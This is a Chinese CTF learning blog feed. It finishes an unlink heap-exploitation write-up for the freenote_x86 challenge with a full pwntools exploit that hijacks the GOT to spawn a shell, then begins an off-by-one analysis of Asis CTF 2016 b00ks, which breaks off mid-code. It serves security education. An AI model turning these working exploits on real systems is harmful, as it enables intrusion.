alt="" data-src="/2019/08/07/PWN学习之unlink/13.JPG" class="lazyload"></p><p>代码流程如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="string">'a'</span>*<span class="number">16</span>) <span class="comment">#chunk0</span></span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">16</span>) <span class="comment">#chunk1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="string">'1234'</span>) <span class="comment">#如果是new('123/x00')就无法泄露，这就是漏洞产生的原因</span></span><br><span class="line">list()</span><br><span class="line">leak_addr = u32(p.recvuntil(<span class="string">"aaaa"</span>)[<span class="number">-8</span>:<span class="number">-4</span>])</span><br><span class="line">offset = <span class="number">0x1b07b0</span></span><br><span class="line">libc_addr = leak_addr - offset </span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br></pre></td></tr></table></figure><h4 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h4><p>当两个不相邻的small chunk被free掉时，会建立双向链表。在上面的基础上，再new两个大小为16的chunk，然后delete第一个和第三个</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/14.JPG" class="lazyload"></p><p>可以更详细地看到索引堆的结构，以及被free掉的chunk0、chunk2和main arena之间形成的双向链表。可以用上面同样的方法泄露chunk2的地址，然后减掉offset=0x0804bd28-0x0804b000=d28</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xd28 = 0xc10 + 0x80*2 + 0x8*3</span><br><span class="line">3个0x8分别为索引堆、chunk0和chunk1的header</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="string">'c'</span>*<span class="number">16</span>) <span class="comment">#chunk2</span></span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">16</span>) <span class="comment">#chunk3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="string">'1234'</span>)</span><br><span class="line">list()</span><br><span class="line">leak_addr = u32(p.recvuntil(<span class="string">"aaaa"</span>)[<span class="number">-8</span>:<span class="number">-4</span>])</span><br><span class="line">heap_addr = leak_addr - <span class="number">0xd28</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><p>unlink操作如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = p-&gt;fd</span><br><span class="line">BK = p-&gt;bk</span><br><span class="line">FD-&gt;bk = BK &lt;==&gt; p-&gt;fd+12 = p-&gt;bk</span><br><span class="line">BK-&gt;fd = FD &lt;==&gt; p-&gt;bk+8  = p-&gt;fd</span><br></pre></td></tr></table></figure><p>进行unlink之前的检查如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br></pre></td></tr></table></figure><p>绕过方法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fakeFD = p-&gt;fd = *p-12</span><br><span class="line">fakeBK = p-&gt;bk = *p-8</span><br></pre></td></tr></table></figure><p>最后结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = *p-12</span><br></pre></td></tr></table></figure><p>因此可以new一个0x80*2的note，然后利用double free 来delete第二个</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/16.JPG" class="lazyload"></p><p>chunk0的地址为0x97a0018，指向0x97a0018-12=0x97a000c。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chunk0 = heap_addr + <span class="number">0x18</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(<span class="number">0x81</span>) + p32(chunk0<span class="number">-12</span>) + p32(chunk0<span class="number">-8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p32(<span class="number">0x80</span>) + p32(<span class="number">0x80</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'a'</span>)</span><br><span class="line">new(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><p>首先edit第一个note，因为此时chunk0所指向的是chunk0-12。先填充前面的12字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(<span class="number">2</span>) + p32(<span class="number">1</span>) +p32(<span class="number">0x4</span>)</span><br><span class="line"><span class="comment">#note数量为2</span></span><br><span class="line"><span class="comment">#chunk0存在</span></span><br><span class="line"><span class="comment">#长度为0x4,避免进行realloc</span></span><br></pre></td></tr></table></figure><p>然后在chunk0处填上free函数的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(elf.got[<span class="string">'free'</span>])</span><br></pre></td></tr></table></figure><p>然后填充chunk1的索引信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload += p32（<span class="number">1</span>） + p32(<span class="number">8</span>) + p32(heap_addr + <span class="number">0xca8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure><p>然后将free函数改为system函数，将chunk1的内容改为<code>/bin/sh</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(0,p32(libc_addr + libc.symbols[&apos;system&apos;]))</span><br><span class="line">edit(1, &apos;/bin/sh\x00&apos;)</span><br></pre></td></tr></table></figure><p>最后delete(1)，将free(chunk1)变成system(‘/bin/sh’)。完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./freenote_x86"</span>)</span><br><span class="line"><span class="comment">#p = remote('pwn2.jarvisoj.com', 9885)</span></span><br><span class="line">elf = ELF(<span class="string">'./freenote_x86'</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib32/libc.so.6"</span>)</span><br><span class="line">a = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="comment">#return p.recv()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(s)</span>:</span></span><br><span class="line">l = len(s)</span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"new note:"</span>)</span><br><span class="line">p.sendline(str(l))</span><br><span class="line">p.recvuntil(<span class="string">"your note:"</span>)</span><br><span class="line">p.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,s)</span>:</span></span><br><span class="line">l = len(s)</span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"number:"</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">"of note:"</span>)</span><br><span class="line">p.sendline(str(l))</span><br><span class="line">p.recvuntil(<span class="string">"your note:"</span>)</span><br><span class="line">p.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"number:"</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="comment">#####泄露libc基地址#####</span></span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">16</span>) <span class="comment">#chunk0</span></span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">16</span>) <span class="comment">#chunk1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="string">'1234'</span>)</span><br><span class="line">list()</span><br><span class="line">leak_addr = u32(p.recvuntil(<span class="string">"aaaa"</span>)[<span class="number">-8</span>:<span class="number">-4</span>])</span><br><span class="line"><span class="keyword">print</span> hex(leak_addr)</span><br><span class="line">offset = <span class="number">0x1b07b0</span></span><br><span class="line">libc_addr = leak_addr - offset </span><br><span class="line"></span><br><span class="line"><span class="comment">#####泄露堆地址#####</span></span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">16</span>) <span class="comment">#chunk2</span></span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">16</span>) <span class="comment">#chunk3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="string">'1234'</span>)</span><br><span class="line">list()</span><br><span class="line">leak_addr = u32(p.recvuntil(<span class="string">"aaaa"</span>)[<span class="number">-8</span>:<span class="number">-4</span>])</span><br><span class="line"><span class="keyword">print</span> hex(leak_addr)</span><br><span class="line">heap_addr = leak_addr - <span class="number">0xd28</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#####unlink#####</span></span><br><span class="line">chunk0 = heap_addr+<span class="number">0x18</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(<span class="number">0x81</span>) + p32(chunk0<span class="number">-12</span>) + p32(chunk0<span class="number">-8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p32(<span class="number">0x80</span>) + p32(<span class="number">0x80</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'a'</span>)</span><br><span class="line">new(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#####hijack got#####</span></span><br><span class="line">payload = p32(<span class="number">2</span>) + p32(<span class="number">1</span>) + p32(<span class="number">4</span>) + p32(elf.got[<span class="string">'free'</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(<span class="number">8</span>) + p32(heap_addr + <span class="number">0xca8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,p32(libc_addr + libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img alt="" data-src="/2019/08/07/PWN学习之unlink/15.JPG" class="lazyload"></p><p>这个方法打不了远程，因为无法获取libc的基地址。</p>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PWN学习之off-by-one</title>
      <link href="/2019/08/03/off-by-one/"/>
      <url>/2019/08/03/off-by-one/</url>
      
        <content type="html"><![CDATA[<h3 id="off-by-one-原理"><a href="#off-by-one-原理" class="headerlink" title="off-by-one 原理"></a>off-by-one 原理</h3><p>严格来说，off-by-one漏洞是一种特殊的溢出漏洞，指程序向缓冲区中写入时，写入的字节数超过了缓冲区本身的大小，并且只越界了一个字节。这种漏洞的产生往往与边界验证不严或字符串操作有关，当然也有可能写入的size正好就只多了一个字节：</p><ul><li>使用循环语句向缓冲区中写入数据时，循环的次数设置错误导致多写入一个字节</li><li>字符串操作不合适，比如忽略了字符串末尾的<code>\x00</code></li></ul><p>一般而言，单字节溢出很难利用。但因为Linux中的堆管理机制ptmalloc验证的松散型，基于Linux堆的off-by-one漏洞利用起来并不复杂，而且威力强大。需要说明的是，<code>off-by-one</code>是可以基于各种缓冲区的，如栈、bss段等。但堆上的<code>off-by-one</code>在CTF中比较常见，下面以Asis CTF 2016 b00ks为实例进行分析，该例子正是由于忽略字符串末尾的<code>\x00</code>溢出而导致任意字符串的读写。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><h4 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h4><p>该程序是一个图书馆管理系统，可以添加、删除、查询、修改图书。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Welcome to ASISCTF book library</span><br><span class="line">Enter author name: kangel</span><br><span class="line"></span><br><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br></pre></td></tr></table></figure><h4 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h4><p><code>Full RELRO</code>说明got不可写，因此我们需要修改<code>__free_hook</code>函数劫持程序流，后面会详细介绍。</p><p>栈保护未开启，也没有栈溢出可以利用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  Asis_2016_b00ks checksec b00ks    </span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf-challenges/pwn/heap/off_by_one/Asis_2016_b00ks/b00ks'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>堆结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_F55</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nEnter book name size: "</span>, *(_QWORD *)&amp;v2);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter book name (Max 32 chars): "</span>, &amp;v2);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(v2);    <span class="comment">//malloc 存书名</span></span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_9F5(ptr, v2 - <span class="number">1</span>) )  <span class="comment">//sub_9F5漏洞函数</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fail to read name"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v2 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nEnter book description size: "</span>, *(_QWORD *)&amp;v2);</span><br><span class="line">        __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = <span class="built_in">malloc</span>(v2);  <span class="comment">//malloc 存description</span></span><br><span class="line">          <span class="keyword">if</span> ( v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Enter book description: "</span>, &amp;v2);</span><br><span class="line">            v0 = v6;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_9F5(v6, v2 - <span class="number">1</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"Unable to read description"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v3 = sub_B24(v0);</span><br><span class="line">              <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Library is full"</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);   <span class="comment">//存图书基本信息</span></span><br><span class="line">                <span class="keyword">if</span> ( v4 )</span><br><span class="line">                &#123;</span><br><span class="line">                  *((_DWORD *)v4 + <span class="number">6</span>) = v2;      <span class="comment">//书描述大小，QWORD==DWORD*2</span></span><br><span class="line">                  *((_QWORD *)off_202010 + v3) = v4;  <span class="comment">//图书信息指针</span></span><br><span class="line">                  *((_QWORD *)v4 + <span class="number">2</span>) = v6;      <span class="comment">//书描述指针</span></span><br><span class="line">                  *((_QWORD *)v4 + <span class="number">1</span>) = ptr;     <span class="comment">//书名指针</span></span><br><span class="line">                  *(_DWORD *)v4 = ++unk_202024;  <span class="comment">//图书ID</span></span><br><span class="line">                  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Unable to allocate book struct"</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Fail to allocate memory"</span>, &amp;v2);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Malformed size"</span>, &amp;v2);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"unable to allocate enough space"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Malformed size"</span>, &amp;v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    <span class="built_in">free</span>(v6);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">free</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;   <span class="comment">//漏洞位置，NULL溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_BBD</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the book id you want to delete: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; (!*((_QWORD *)off_202010 + i) || **((_DWORD **)off_202010 + i) != v1); ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( i != <span class="number">20</span> )</span><br><span class="line">    &#123;</span><br><span 